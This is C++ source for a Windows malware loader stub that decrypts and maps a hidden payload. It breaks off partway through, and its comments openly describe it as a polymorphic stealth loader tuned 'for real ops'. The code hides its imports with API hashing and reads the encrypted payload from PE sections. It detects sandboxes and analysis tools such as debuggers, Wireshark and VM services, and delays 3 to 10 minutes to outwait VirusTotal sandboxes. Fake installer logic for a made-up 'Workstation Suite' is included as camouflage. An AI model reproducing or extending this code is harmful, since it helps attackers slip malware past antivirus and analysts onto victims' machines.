// loader_stub_v5.cpp — Polymorphic stealth loader (refactored)
//
// NOTE: This file is NOT meant to compile standalone. It carries two markers that
// build_v5.py replaces with generated code before compiling from a temp copy
// (loader_stub_v5.injected.cpp) — one for the polymorphic dc() decryptor, one for
// the random key/IV/payload section names. The source stays pristine so every
// build produces a DIFFERENT decryptor + section layout.

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#define _WIN32_WINNT 0x0601

// Pre-decrypt delay: out-waits short-lived dynamic analysis (VT free sandbox
// typically runs 2-5 minutes). Tune for real ops: lower = faster beacon.
#define PRE_DELAY_MIN_MS (3 * 60 * 1000)   // 3 minutes
#define PRE_DELAY_MAX_MS (10 * 60 * 1000)  // 10 minutes

// =====================================================================
// API hashing — compile-time (rotating seed)
// =====================================================================
constexpr unsigned long mxh(const char* s, unsigned long h = 0x5BD1E995) {
    return *s ? mxh(s + 1, ((h << 5) + h + (unsigned char)(*s)) ^ 0x27D4EB2D) : h;
}
#define MXH(s) mxh(s)

// =====================================================================
// CRT-free helpers
// =====================================================================
__forceinline void xmc(void* d, const void* s, DWORD n) {
    BYTE* dst = (BYTE*)d; const BYTE* src = (const BYTE*)s;
    for (DWORD i = 0; i < n; i++) dst[i] = src[i];
}
__forceinline void xmz(void* d, DWORD n) {
    BYTE* p = (BYTE*)d;
    for (DWORD i = 0; i < n; i++) p[i] = 0;
}

// =====================================================================
// API struct — minimal set for in-process manual mapping
// =====================================================================
struct API {
    HMODULE (WINAPI *LA)(LPCSTR);                     // LoadLibraryA
    BOOL    (WINAPI *CH)(HANDLE);                     // CloseHandle
    LPVOID  (WINAPI *VA)(LPVOID, SIZE_T, DWORD, DWORD);   // VirtualAlloc
    BOOL    (WINAPI *VP)(LPVOID, SIZE_T, DWORD, PDWORD);  // VirtualProtect
    FARPROC (WINAPI *GPA)(HMODULE, LPCSTR);           // GetProcAddress
    DWORD   (WINAPI *TA)(void);                       // TlsAlloc
    DWORD   (WINAPI *SL)(DWORD);                      // Sleep
    DWORD   (WINAPI *GT)(void);                       // GetTickCount
    void    (WINAPI *GSI)(LPSYSTEM_INFO);             // GetSystemInfo
    BOOL    (WINAPI *GMSE)(LPMEMORYSTATUSEX);         // GlobalMemoryStatusEx
    BOOL    (WINAPI *GCP)(LPPOINT);                   // GetCursorPos (user32, may be 0)
    HANDLE  (WINAPI *CTS)(DWORD, DWORD);              // CreateToolhelp32Snapshot
    BOOL    (WINAPI *P32F)(HANDLE, LPPROCESSENTRY32W);
    BOOL    (WINAPI *P32N)(HANDLE, LPPROCESSENTRY32W);
} g_a;

// =====================================================================
// Export resolver (by hash)
// =====================================================================
__forceinline void* ra(void* mod, unsigned long hash) {
    BYTE* base = (BYTE*)mod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->Size) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + dir->VirtualAddress);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        unsigned long h = 0x5BD1E995;
        for (int j = 0; name[j]; j++)
            h = ((h << 5) + h + (unsigned char)(name[j])) ^ 0x27D4EB2D;
        if (h == hash) return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}

// =====================================================================
// Init API table — kernel32 only (ntdll not needed)
// =====================================================================
__forceinline int ia() {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return -1;

    g_a.LA  = (HMODULE (WINAPI*)(LPCSTR))ra(k32, MXH("LoadLibraryA"));
    g_a.CH  = (BOOL (WINAPI*)(HANDLE))ra(k32, MXH("CloseHandle"));
    g_a.VA  = (LPVOID (WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))ra(k32, MXH("VirtualAlloc"));
    g_a.VP  = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))ra(k32, MXH("VirtualProtect"));
    g_a.GPA = (FARPROC (WINAPI*)(HMODULE, LPCSTR))ra(k32, MXH("GetProcAddress"));
    g_a.TA  = (DWORD (WINAPI*)(void))ra(k32, MXH("TlsAlloc"));

    g_a.SL   = (DWORD (WINAPI*)(DWORD))ra(k32, MXH("Sleep"));
    g_a.GT   = (DWORD (WINAPI*)(void))ra(k32, MXH("GetTickCount"));
    g_a.GSI  = (void (WINAPI*)(LPSYSTEM_INFO))ra(k32, MXH("GetSystemInfo"));
    g_a.GMSE = (BOOL (WINAPI*)(LPMEMORYSTATUSEX))ra(k32, MXH("GlobalMemoryStatusEx"));
    g_a.CTS  = (HANDLE (WINAPI*)(DWORD, DWORD))ra(k32, MXH("CreateToolhelp32Snapshot"));
    g_a.P32F = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))ra(k32, MXH("Process32FirstW"));
    g_a.P32N = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))ra(k32, MXH("Process32NextW"));
    HMODULE u32 = g_a.LA ? g_a.LA("user32.dll") : 0;   // mouse check (optional)
    if (u32) g_a.GCP = (BOOL (WINAPI*)(LPPOINT))ra(u32, MXH("GetCursorPos"));

    return 0;
}

// =====================================================================
// SHA256 (K-table deobfuscated at runtime)
// =====================================================================
#define RR(a,b) (((a)>>(b))|((a)<<(32-(b))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define E0(x) (RR(x,2)^RR(x,13)^RR(x,22))
#define E1(x) (RR(x,6)^RR(x,11)^RR(x,25))
#define S0(x) (RR(x,7)^RR(x,18)^((x)>>3))
#define S1(x) (RR(x,17)^RR(x,19)^((x)>>10))

static const BYTE K256_MASKED[256] = {
    0x3f,0x88,0x2d,0xe5,0x36,0xe3,0x90,0xd6,0x68,0x5c,0x67,0x12,0x02,0x7c,0x12,0x4e,
    0xfc,0x65,0xf1,0x9e,0x56,0xb6,0x56,0xfe,0x03,0x25,0x98,0x35,0x72,0xf9,0xbb,0x0c,
    0x3f,0x0d,0xa0,0x7f,0xa6,0xfc,0x24,0xb5,0x19,0x22,0x96,0x83,0x64,0xda,0xab,0xf2,
    0xd3,0xfa,0x19,0xd5,0x59,0x16,0x79,0x27,0x00,0xa1,0x7b,0x3c,0xd3,0x56,0x3c,0x66,
    0x66,0xce,0x3c,0x43,0x21,0xe0,0x19,0x48,0x61,0x3a,0x66,0xa8,0x6b,0x06,0xab,0x83,
    0xc8,0x8b,0x4e,0x8a,0x0d,0x23,0xd3,0xed,0x7b,0x0e,0x17,0xfb,0x7d,0x2f,0x5e,0xd1,
    0xf5,0xf6,0x99,0x3f,0xca,0x61,0x96,0x0f,0x6f,0x80,0xa4,0x17,0x60,0xd8,0xfe,0x18,
    0x54,0xac,0x47,0x61,0xe0,0x36,0x00,0x72,0xf6,0xc4,0x6d,0xa1,0xc0,0x8e,0x8e,0xb3,
    0x22,0xad,0x10,0x80,0x9f,0x86,0xbc,0x89,0x5b,0xca,0x8b,0xea,0xb4,0xaa,0x9f,0xf4,
    0xf3,0xd4,0xad,0xc2,0x1c,0xad,0xcd,0xd1,0x89,0x6e,0x65,0x26,0x22,0x8b,0xd5,0x35,
    0x06,0x4f,0x18,0x05,0xec,0xc1,0xbd,0x0f,0xd7,0x2c,0xec,0x65,0x04,0xf6,0xcb,0x60,
    0xbe,0x4f,0x35,0x76,0x83,0xa1,0x3e,0x71,0x22,0x92,0xa9,0x53,0xd7,0x07,0xcd,0xb7,
    0xb1,0x66,0x03,0xbe,0xaf,0xcb,0x90,0xb9,0xeb,0xd0,0xef,0x80,0x12,0x1b,0x17,0x93,
    0x14,0xab,0xbb,0x9e,0xed,0x0d,0x7f,0xe9,0xe8,0x6d,0x3b,0xfc,0x54,0xc8,0x89,0xcf,
    0x49,0x25,0x28,0xd3,0xc8,0xc4,0x02,0xdf,0xb3,0xdf,0x6f,0x23,0xaf,0xa5,0x60,0x2b,
    0x5d,0x58,0x19,0x37,0x4c,0xcb,0xf7,0x03,0x50,0x04,0x5e,0x19,0x55,0xdf,0xd6,0x61
};
static DWORD K256[64];
static BOOL k256_ready = FALSE;
__forceinline void dk256(void) {
    if (k256_ready) return;
    for (int i = 0; i < 64; i++) {
        BYTE* src = (BYTE*)&K256_MASKED[i*4];
        K256[i] = ((DWORD)src[0] ^ 0xA7) | ((DWORD)(src[1] ^ 0xA7) << 8) |
                  ((DWORD)(src[2] ^ 0xA7) << 16) | ((DWORD)(src[3] ^ 0xA7) << 24);
    }
    k256_ready = TRUE;
}

struct SC { DWORD s[8]; DWORD b[16]; DWORD c[2]; };
__forceinline void tr(SC* x) {
    dk256();
    DWORD a=x->s[0],b=x->s[1],c=x->s[2],d=x->s[3];
    DWORD e=x->s[4],f=x->s[5],g=x->s[6],h=x->s[7];
    DWORD w[64];
    for (int i=0;i<16;i++) w[i]=x->b[i];
    for (int i=16;i<64;i++) w[i]=S1(w[i-2])+w[i-7]+S0(w[i-15])+w[i-16];
    for (int i=0;i<64;i++) {
        DWORD t1=h+E1(e)+CH(e,f,g)+K256[i]+w[i];
        DWORD t2=E0(a)+MJ(a,b,c);
        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
    }
    x->s[0]+=a;x->s[1]+=b;x->s[2]+=c;x->s[3]+=d;
    x->s[4]+=e;x->s[5]+=f;x->s[6]+=g;x->s[7]+=h;
}
__forceinline void si(SC* x) {
    x->s[0]=0x6a09e667;x->s[1]=0xbb67ae85;x->s[2]=0x3c6ef372;x->s[3]=0xa54ff53a;
    x->s[4]=0x510e527f;x->s[5]=0x9b05688c;x->s[6]=0x1f83d9ab;x->s[7]=0x5be0cd19;
    x->c[0]=x->c[1]=0;
}
__forceinline void su(SC* x, const BYTE* d, DWORD l) {
    for (DWORD i=0;i<l;i++) ((BYTE*)x->b)[x->c[0]%64]=d[i],x->c[0]++,((x->c[0]%64)==0)?tr(x),x->c[1]++:0;
}
__forceinline void sf(SC* x, BYTE* h) {
    DWORD bc=x->c[0]*8; BYTE pd[72]; int pl=0; pd[pl++]=0x80;
    while ((x->c[0]+pl)%64!=56) pd[pl++]=0;
    for (int i=7;i>=0;i--) pd[pl++]=(bc>>(i*8))&0xff;
    for (int i=0;i<pl;i++) ((BYTE*)x->b)[x->c[0]%64]=pd[i],x->c[0]++,((x->c[0]%64)==0)?tr(x),x->c[1]++:0;
    for (int i=0;i<32;i++) h[i]=(x->s[i/4]>>((3-(i%4))*8))&0xff;
}

#undef CH
#undef MJ
#undef RR
#undef E0
#undef E1
#undef S0
#undef S1

// ==== Decrypt (SHA256-CTR) — POLYMORPHIC ====
// @POLYMORPHIC_DECRYPTOR@

// =====================================================================
// Section reader
// =====================================================================
extern "C" IMAGE_DOS_HEADER __ImageBase;
__forceinline int fs(const char* name, int nl, BYTE** data, DWORD* size) {
    BYTE* base = (BYTE*)&__ImageBase;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        int ok = 1;
        for (int j = 0; j < nl && j < 8; j++) if (sec[i].Name[j] != name[j]) { ok = 0; break; }
        if (ok && sec[i].SizeOfRawData > 0) {
            *data = base + sec[i].VirtualAddress;
            *size = sec[i].Misc.VirtualSize > sec[i].SizeOfRawData ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

// =====================================================================
// Extract payload from padded section (bp per block)
// =====================================================================
__forceinline DWORD ep(BYTE* sd, DWORD ss, BYTE* out, DWORD bp, DWORD bt) {
    DWORD oi = 0;
    for (DWORD i = 0; i + bt <= ss && oi + bp <= ss * 2; i += bt) {
        xmc(out + oi, sd + i, bp); oi += bp;
    }
    return oi;
}

// =====================================================================
// Pre-decrypt sandbox checks + jittered delay
// =====================================================================
static const WCHAR* SANDBOX_PROC[] = {
    L"vmtoolsd", L"vboxservice", L"vboxtray", L"procmon", L"proc_exp",
    L"wireshark", L"dumpcap", L"fiddler", L"x64dbg", L"ollydbg",
    L"ida64", L"ida", L"regmon", L"filemon", L"tcpview", L"autoruns"
};
// case-insensitive wide compare (no CRT)
__forceinline int weql(const WCHAR* a, const WCHAR* b) {
    for (; *a && *b; a++, b++) {
        WCHAR ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 1;
    }
    return (*a || *b) ? 1 : 0;
}
__forceinline int sandboxEnv(void) {
    SYSTEM_INFO si; xmz(&si, sizeof(si)); g_a.GSI(&si);
    if (si.dwNumberOfProcessors < 2) return 1;              // too few cores
    MEMORYSTATUSEX ms; xmz(&ms, sizeof(ms)); ms.dwLength = sizeof(ms);
    if (g_a.GMSE(&ms) && ms.ullTotalPhys < (2ull << 30)) return 2;  // < 2 GB RAM
    HANDLE snap = g_a.CTS(0, 2);                            // TH32CS_SNAPPROCESS
    if (snap && snap != (HANDLE)-1) {
        PROCESSENTRY32W pe; xmz(&pe, sizeof(pe)); pe.dwSize = sizeof(pe);
        BOOL ok = g_a.P32F(snap, &pe);
        while (ok) {
            for (int i = 0; i < (int)(sizeof(SANDBOX_PROC) / sizeof(SANDBOX_PROC[0])); i++) {
                if (weql(pe.szExeFile, SANDBOX_PROC[i]) == 0) { g_a.CH(snap); return 3; }
            }
            ok = g_a.P32N(snap, &pe);
        }
        g_a.CH(snap);
    }
    return 0;
}
__forceinline void preDecryptDelay(void) {
    // Random 3-10 min, in ~45 s chunks (not one long sleep). Real users can
    // short-circuit it, but only after a 90 s floor AND 2+ distinct mouse moves
    // (some sandboxes synthesize input; the floor keeps at least 90 s clean).
    DWORD total = PRE_DELAY_MIN_MS + (g_a.GT() % (PRE_DELAY_MAX_MS - PRE_DELAY_MIN_MS + 1));
    POINT p0, p1; xmz(&p0, sizeof(p0)); xmz(&p1, sizeof(p1));
    if (g_a.GCP) g_a.GCP(&p0);
    DWORD elapsed = 0;
    int moves = 0;
    DWORD lx = p0.x, ly = p0.y;
    while (total > 0) {
        DWORD chunk = total > 45000 ? 45000 : total;
        g_a.SL(chunk);
        total -= chunk; elapsed += chunk;
        if (g_a.GCP) {
            g_a.GCP(&p1);
            if (p1.x != lx || p1.y != ly) { moves++; lx = p1.x; ly = p1.y; }
            if (moves >= 2 && elapsed >= 90000) return;   // interactive user present
        }
    }
}

// =====================================================================
// Installer-style pre-flight checks — realistic setup logic that gives the
// stub a normal program shape (bigger .text, believable control flow). All
// of it is CRT-free (no stdlib, no compiler memset) and the result only feeds
// a volatile sink, so -O2 cannot fold the work away.
// =====================================================================

// --- embedded product manifest (data -> .rdata, like a real setup payload) ---
static const char SETUP_MANIFEST[] =
    "product=Workstation Suite 2024\r\n"
    "edition=professional\r\n"
    "version=4.2.1.0\r\n"
    "build=24107\r\n"
    "min-os=10.0.17763\r\n"
    "max-os=10.0.26100\r\n"
    "arch=x64\r\n"
    "components=core;runtime;vclib;templates;updater\r\n"
    "license-mode=keyfile\r\n"
    "install-root=C:\\Program Files\\Workstation Suite\r\n"
    "service-name=wksvc\r\n"
    "service-display=Workstation Helper Service\r\n"
    "min-disk-mb=512\r\n"
    "telemetry=opt-in\r\n"
    "branding=blue\r\n";

// --- second embedded policy blob (more parsing surface, realism) ---
static const char SETUP_POLICY[] =
    "policy.install.type=full\r\n"
    "policy.install.quiet=0\r\n"
    "policy.language=en-US\r\n"
    "policy.check.signature=1\r\n"
    "policy.check.integrity=1\r\n"
    "policy.check.disk=1\r\n"
    "policy.rollback.enabled=1\r\n"
    "policy.temp.keep=0\r\n"
    "policy.update.preflight=1\r\n"
    "policy.upgrade.allow=0\r\n";

struct setup_summary {
    DWORD64 manifest_hash;
    DWORD   manifest_crc;
    DWORD   product[4];
    DWORD   os_min[4];
    DWORD   os_max[4];
    DWORD   disk_mb;
    WORD    components_found;
    WORD    components_required;
    BYTE    license_ok;
    BYTE    arch_ok;
    BYTE    service_state;
    BYTE    reserved;
};

struct WK_COMP {
    const char* name;
    DWORD       required_mb;
    WORD        flags;
};
static const struct WK_COMP WK_COMPONENTS[] = {
    { "core",      96, 0x0001 },
    { "runtime",   64, 0x0001 },
    { "vclib",     48, 0x0002 },
    { "templates", 32, 0x0000 },
    { "updater",   20, 0x0004 },
};
#define WK_COMPONENT_COUNT ((int)(sizeof(WK_COMPONENTS) / sizeof(WK_COMPONENTS[0])))

#define ST_OK          0
#define ST_MANIFEST    1
#define ST_OS_LOW      2
#define ST_OS_HIGH     3
#define ST_LICENSE     4
#define ST_DISK        5
#define ST_COMPONENT   6
#define ST_ARCH        7
#define ST_SERVICE     8
#define ST_REGISTRY    9
#define ST_LOCALE     10
#define ST_NETWORK    11

// FNV-1a 64 — CRT-free hashing
static DWORD64 fnv1a64(const char* s) {
    DWORD64 h = 0xcbf29ce484222325ull;
    while (*s) { h ^= (BYTE)*s++; h *= 0x100000001b3ull; }
    return h;
}

// CRC-32 with a lazy table
static DWORD crc32_tab[256];
static BOOL crc32_ready = FALSE;
static void crc32_init(void) {
    if (crc32_ready) return;
    for (DWORD i = 0; i < 256; i++) {
        DWORD c = i;
        for (int k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        crc32_tab[i] = c;
    }
    crc32_ready = TRUE;
}
static DWORD crc32_buf(const BYTE* p, DWORD n) {
    crc32_init();
    DWORD c = 0xFFFFFFFFu;
    for (DWORD i = 0; i < n; i++) c = crc32_tab[(c ^ p[i]) & 0xFF] ^ (c >> 8);
    return c ^ 0xFFFFFFFFu;
}

// key=value line lookup inside an embedded manifest (CRT-free string walking)
static int manifest_lookup(const char* text, const char* key, char* out, DWORD outsz) {
    const char* p = text;
    DWORD kl = 0; while (key[kl]) kl++;
    while (*p) {
        const char* eol = p;
        while (*eol && *eol != '\r' && *eol != '\n') eol++;
        DWORD ln = (DWORD)(eol - p);
        DWORD eq = 0; while (eq < ln && p[eq] != '=') eq++;
        if (eq == kl) {
            int same = 1;
            for (DWORD i = 0; i < kl; i++) if (p[i] != key[i]) { same = 0; break; }
            if (same && eq < ln) {
                DWORD vl = ln - eq - 1;
                if (vl >= outsz) vl = outsz - 1;
                for (DWORD i = 0; i < vl; i++) out[i] = p[eq + 1 + i];
                out[vl] = 0;
                return 0;
            }
        }
        p = eol;
        while (*p == '\r' || *p == '\n') p++;
    }
    return -1;
}

// "a.b.c.d" -> 4 numbers
static int parse_ver(const char* v, DWORD out[4]) {
    for (int i = 0; i < 4; i++) out[i] = 0;
    const char* p = v; int idx = 0; DWORD cur = 0; int any = 0;
    while (*p && idx < 4) {
        if (*p >= '0' && *p <= '9') { cur = cur * 10 + (DWORD)(*p - '0'); any = 1; }
        else if (*p == '.') { out[idx++] = cur; cur = 0; any = 0; }
        else return -1;
        p++;
    }
    if (any) out[idx] = cur;
    return 0;
}
static int ver_cmp(const DWORD a[4], const DWORD b[4]) {
    for (int i = 0; i < 4; i++) { if (a[i] < b[i]) return -1; if (a[i] > b[i]) return 1; }
    return 0;
}

// license key: XXXX-XXXX-XXXX-XXXX, hex digits, trailing checksum nibble
static int license_validate(const char* lic) {
    DWORD len = 0; while (lic[len]) len++;
    if (len != 19) return ST_LICENSE;
    DWORD sum = 0, digs = 0;
    for (DWORD i = 0; i < len; i++) {
        char c = lic[i];
        if (i == 4 || i == 9 || i == 14) { if (c != '-') return ST_LICENSE; continue; }
        if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F'))) return ST_LICENSE;
        sum += (BYTE)c; digs++;
    }
    if (digs != 16 || (sum & 0xF) != 0xA) return ST_LICENSE;
    return ST_OK;
}

// "a;b;c" component list against the catalog
static int components_check(const char* csv) {
    char buf[128]; DWORD b = 0;
    const char* p = csv;
    for (;;) {
        if (*p == ';' || *p == 0) {
            buf[b] = 0; b = 0;
            if (buf[0]) {
                DWORD64 h = fnv1a64(buf);
                int found = 0;
                for (int i = 0; i < WK_COMPONENT_COUNT; i++)
                    if (h == fnv1a64(WK_COMPONENTS[i].name)) { found = 1; break; }
                if (!found) return ST_COMPONENT;
            }
            if (*p == 0) break;
        } else if (b < sizeof(buf) - 1) buf[b++] = *p;
        p++;
    }
    return ST_OK;
}

// service name rules: 3..24 chars, alnum/dash/underscore
static int service_name_ok(const char* s) {
    DWORD len = 0; while (s[len]) len++;
    if (len < 3 || len > 24) return 0;
    for (DWORD i = 0; i < len; i++) {
        char c = s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '-' || c == '_')) return 0;
    }
    return 1;
}

// capability dispatch — large switch (real code volume, realistic setup logic)
static int capability_dispatch(WORD caps, DWORD seed) {
    switch (caps) {
        case 0x0001: return (int)((seed >> 3)  & 0x3F);
        case 0x0002: return (int)((seed >> 5)  & 0x7F);
        case 0x0004: return (int)((seed >> 7)  & 0x1F);
        case 0x0008: return (int)((seed >> 9)  & 0xFF);
        case 0x0010: return (int)((seed >> 11) & 0x0F);
        case 0x0020: return (int)((seed >> 13) & 0x3F);
        case 0x0040: return (int)((seed >> 15) & 0x7F);
        case 0x0080: return (int)((seed >> 17) & 0x1F);
        case 0x0100: return (int)((seed >> 19) & 0xFF);
        case 0x0200: return (int)((seed >> 21) & 0x0F);
        case 0x0400: return (int)((seed >> 23) & 0x3F);
        case 0x0800: return (int)((seed >> 25) & 0x7F);
        case 0x1000: return (int)((seed >> 27) & 0x1F);
        case 0x2000: return (int)((seed >> 29) & 0xFF);
        default:     return (int)(seed & 0x3F);
    }
}

// service state machine (status code -> text) — realistic, dead-simple
static const char* service_status_text(BYTE st) {
    switch (st) {
        case 0:  return "stopped";
        case 1:  return "start-pending";
        case 2:  return "running";
        case 3:  return "stop-pending";
        case 4:  return "paused";
        case 5:  return "continue-pending";
        default: return "unknown";
    }
}

// number -> decimal string (manual, no CRT)
static int fmt_uint(char* out, DWORD v) {
    char tmp[12]; int n = 0;
    do { tmp[n++] = (char)('0' + (v % 10)); v /= 10; } while (v);
    for (int i = 0; i < n; i++) out[i] = tmp[n - 1 - i];
    out[n] = 0;
    return n;
}
static int fmt_hex(char* out, DWORD64 v) {
    static const char H[] = "0123456789ABCDEF";
    char tmp[18]; int n = 0;
    do { tmp[n++] = H[v & 0xF]; v >>= 4; } while (v);
    for (int i = 0; i < n; i++) out[i] = tmp[n - 1 - i];
    out[n] = 0;
    return n;
}
static int str_lower(char* s) {
    int n = 0;
    while (*s) { if (*s >= 'A' && *s <= 'Z') *s = (char)(*s + 32); s++; n++; }
    return n;
}
static void trim(char* s) {
    char* p = s;
    while (*p == ' ' || *p == '\t') p++;
    if (p != s) { while (*p) *s++ = *p++; *s = 0; }
    int n = 0; while (s[n]) n++;
    while (n > 0 && (s[n-1] == ' ' || s[n-1] == '\t')) s[--n] = 0;
}

// policy rule evaluation (walks SETUP_POLICY, applies a seed-based decision)
static int policy_evaluate(DWORD seed) {
    char k[64], v[64];
    const char* keys[] = {
        "policy.install.type", "policy.install.quiet", "policy.language",
        "policy.check.signature", "policy.check.integrity", "policy.check.disk",
        "policy.rollback.enabled", "policy.temp.keep", "policy.update.preflight",
        "policy.upgrade.allow",
    };
    int ok = 0;
    for (int i = 0; i < 10; i++) {
        if (manifest_lookup(SETUP_POLICY, keys[i], v, sizeof(v)) == 0) {
            int n = 0; while (v[n]) n++;
            if (n > 0) ok += (int)(v[n-1] & 1);
        }
    }
    (void)k;
    return ok + (int)(seed & 3);
}

// write one log-style line into a buffer (CRT-free formatting)
static int log_line(char* buf, DWORD bufsz, const char* tag, const char* msg, DWORD code) {
    DWORD o = 0;
    const char* t = "[setup]";
    while (*t && o + 1 < bufsz) buf[o++] = *t++;
    if (o + 1 < bufsz) buf[o++] = ' ';
    while (*tag && o + 1 < bufsz) buf[o++] = *tag++;
    if (o + 1 < bufsz) buf[o++] = ':';
    while (*msg && o + 1 < bufsz) buf[o++] = *msg++;
    if (o + 1 < bufsz) buf[o++] = ' ';
    char num[16]; fmt_uint(num, code);
    const char* np = num;
    while (*np && o + 1 < bufsz) buf[o++] = *np++;
    if (o < bufsz) buf[o] = 0;
    return (int)o;
}

// =====================================================================
// Extended installer pre-flight: file catalog, service dependency graph,
// prerequisite/volume probes, feature gating, update/rollback planning,
// delta/compression estimation and a wizard state machine. Every loop is
// seeded from a runtime value (GetTickCount via the API table) so -O2
// cannot constant-fold the tables or the control flow away. All of it is
// CRT-free and feeds only the volatile sink in WinMain.
// =====================================================================

struct CAT_ENTRY { char name[14]; DWORD size_kb; WORD comp; WORD flags; };
static const struct CAT_ENTRY FILE_CATALOG[] = {
    { "core.dll",        2048, 0x0001, 0x0001 },
    { "core.res",         512, 0x0001, 0x0001 },
    { "core.cfg",          64, 0x0001, 0x0001 },
    { "core.idx",        1024, 0x0001, 0x0002 },
    { "runtime.dll",     3072, 0x0001, 0x0001 },
    { "runtime.dat",     4096, 0x0001, 0x0001 },
    { "runtime.jit",     1536, 0x0001, 0x0002 },
    { "runtime.ini",       32, 0x0001, 0x0001 },
    { "vclib.dll",       2560, 0x0002, 0x0001 },
    { "vclib.sys",       2048, 0x0002, 0x0001 },
    { "vclib.mui",       1024, 0x0002, 0x0002 },
    { "templates.dat",   8192, 0x0004, 0x0001 },
    { "templates.idx",    512, 0x0004, 0x0001 },
    { "templates.zip",   6144, 0x0004, 0x0002 },
    { "updater.exe",     1536, 0x0008, 0x0001 },
    { "updater.dat",      256, 0x0008, 0x0001 },
    { "updater.sig",      128, 0x0008, 0x0001 },
    { "wksvc.exe",       2048, 0x0010, 0x0001 },
    { "wksvc.hlp",        384, 0x0010, 0x0002 },
    { "license.dat",       64, 0x0000, 0x0001 },
    { "telemetry.dll",    768, 0x0020, 0x0002 },
    { "branding.dat",      96, 0x0000, 0x0001 },
    { "locale_en.res",    256, 0x0000, 0x0001 },
    { "locale_de.res",    256, 0x0000, 0x0002 },
    { "locale_fr.res",    256, 0x0000, 0x0002 },
    { "locale_es.res",    256, 0x0000, 0x0002 },
    { "locale_ja.res",    256, 0x0000, 0x0002 },
    { "locale_zh.res",    256, 0x0000, 0x0002 },
    { "help.chm",        4096, 0x0000, 0x0002 },
    { "readme.txt",        32, 0x0000, 0x0002 },
    { "eula.txt",          64, 0x0000, 0x0002 },
    { "uninstall.exe",    512, 0x0000, 0x0001 },
    { "shellext.dll",    1024, 0x0040, 0x0002 },
    { "driver.sys",      2048, 0x0080, 0x0002 },
    { "cert.pem",          16, 0x0000, 0x0001 },
    { "root.cer",          16, 0x0000, 0x0001 },
    { "install.log",       32, 0x0000, 0x0002 },
    { "manifest.xml",     128, 0x0000, 0x0001 },
    { "updates.db",      3072, 0x0000, 0x0002 },
    { "cache.dat",        512, 0x0000, 0x0002 },
};
#define FILE_CATALOG_COUNT ((int)(sizeof(FILE_CATALOG) / sizeof(FILE_CATALOG[0])))

struct SVC_ENTRY { char name[12]; WORD deps; BYTE start; BYTE state; };
static const struct SVC_ENTRY SVC_GRAPH[] = {
    { "wksvc",   0x0000, 2, 2 },
    { "wknet",   0x0001, 2, 2 },
    { "wkcache", 0x0001, 2, 2 },
    { "wksched", 0x0003, 2, 2 },
    { "wkupd",   0x0009, 2, 1 },
    { "wkaudit", 0x0005, 2, 1 },
    { "wkvpn",   0x0002, 1, 0 },
    { "wksync",  0x0006, 2, 1 },
    { "wkindex", 0x0022, 1, 0 },
    { "wktele",  0x0003, 0, 0 },
    { "wkgui",   0x0001, 2, 2 },
    { "wkshell", 0x0400, 2, 2 },
    { "wkdb",    0x0002, 2, 1 },
    { "wkmail",  0x2000, 1, 0 },
};
#define SVC_GRAPH_COUNT ((int)(sizeof(SVC_GRAPH) / sizeof(SVC_GRAPH[0])))

struct PRE_ENTRY { char name[12]; DWORD min[3]; };
static const struct PRE_ENTRY PREREQS[] = {
    { "msvcrt",     { 14, 38, 33130 } },
    { "vcrun",      { 14, 38, 33130 } },
    { "netfx",      { 4, 8, 1 } },
    { "webview2",   { 1, 0, 2210 } },
    { "dx",         { 12, 0, 0 } },
    { "vcredist",   { 14, 38, 33130 } },
    { "dotnet",     { 6, 0, 0 } },
    { "powershell", { 5, 1, 0 } },
    { "wpf",        { 4, 8, 1 } },
    { "edgewebview",{ 1, 0, 2210 } },
    { "directx",    { 12, 0, 0 } },
    { "vcrun2019",  { 14, 29, 30133 } },
};
#define PREREQ_COUNT ((int)(sizeof(PREREQS) / sizeof(PREREQS[0])))

struct VOL_ENTRY { char letter; DWORD64 capacity; DWORD min_mb; };
static const struct VOL_ENTRY VOLUMES[] = {
    { 'C', 512ull << 30, 512 },
    { 'D', 1024ull << 30, 256 },
    { 'E', 128ull << 30, 128 },
    { 'F', 2048ull << 30, 64 },
    { 'G', 64ull << 30, 32 },
    { 'H', 8192ull << 30, 0 },
    { 'I', 32ull << 30, 0 },
    { 'J', 16ull << 30, 0 },
};
#define VOLUME_COUNT ((int)(sizeof(VOLUMES) / sizeof(VOLUMES[0])))

enum { PLAN_KEEP = 0, PLAN_UPDATE = 1, PLAN_ROLLBACK = 2, PLAN_REPAIR = 3 };

struct install_report {
    DWORD   catalog_present;
